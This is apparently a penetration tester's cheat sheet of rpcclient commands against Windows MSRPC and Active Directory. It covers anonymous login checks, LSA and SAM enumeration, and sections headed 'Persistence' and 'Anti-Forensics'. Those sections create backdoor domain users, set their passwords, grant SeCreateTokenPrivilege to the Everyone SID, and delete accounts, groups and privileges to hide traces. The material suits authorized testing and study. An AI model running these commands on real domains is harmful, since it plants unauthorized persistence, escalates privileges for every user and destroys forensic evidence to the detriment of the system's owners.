# Manual

## 01 - Usage

### 1.1 - Samba Suite Utils

- Authenticating with NetBIOS protocol

`$ rpcclient -U <username>%<password> <IP>`

#### 1.1.2 - Anonymous Login

- Check for anonymous login

`$ rpcclient -U "" [-p 593] -N <IP>`

TODO: Re-arrange from this section to post exploitation under **Enumeration and Discovery**

#### 1.1.4 - Domain Users

`rpcclient $> enumdomtrusts`

#### 1.1.5 - LSA Query

- Enumerate SID From LSA

`rpcclient $> lsaquery`

`rpcclient $> dsroledominfo`

- SAM Lookup

`rpcclient $> samlookupnames domain <username>`

`rpcclient $> samlookuprids domain <rid>`

- Enumerating LSA Group Privileges

`rpcclient $> lsaenumsid`

`rpcclient $> lookupsids <SID>`

`rpcclient $> lookupsids S-1-1-0`

`rpcclient $> lsaenumacctrights <SID>`

`rpcclient $> lsaenumacctrights S-1-1-0`

`rpcclient $> lsalookupprivvalue SeCreateTokenPrivilege`

- LSA Query Security Objects

`rpcclient $> lsaquerysecobj`

## Persistence

#### 1.1.6 - Create Accounts

- Create domain user account

`rpcclient $> createdomuser <username>`

```
rpcclient $> setuserinfo2 <username> <level> <password>

rpcclient $> setuserinfo2 <username> 23 <password>

rpcclient $> setuserinfo2 <username> 24 <password>
```

`rpcclient $> enumdomusers`

https://malicious.link/posts/2017/reset-ad-user-password-with-linux/

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN

- LSA create account

`rpcclient $> lsaenumsid`

`rpcclient $> lookupsids S-1-1-0`

Lookup username accounts

`rpcclient $> lookupnames <username>`

`rpcclient $> lsacreateaccount S-1-1-0`

`rpcclient $> lsaaddpriv S-1-1-0 SeCreateTokenPrivilege`

`rpcclient $> lsaenumprivsaccount S-1-1-0`

#### 1.1.7 - Change Password Accounts

`rpcclient $> chgpasswd <username> <old_password> <new_password>`

## Anti-Forensics

#### 1.1.8 - Delete Accounts

- Delete user account

`rpcclient $> deletedomuser <username>`

- Delete domain group

`rpcclient $> deletedomgroup <group_name>`

`rpcclient $> enumdomgroups`

- Delete LSA account privileges

`rpcclient $> lsadelpriv S-1-1-0`

`rpcclient $> lsaenumprivsaccount S-1-1-0`

---
## References

- [0xffsec: MSRPC (Microsoft Remote Procedure Call)](https://0xffsec.com/handbook/services/msrpc/)

- [Hacktricks: 135 Pentesting MSPRC](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)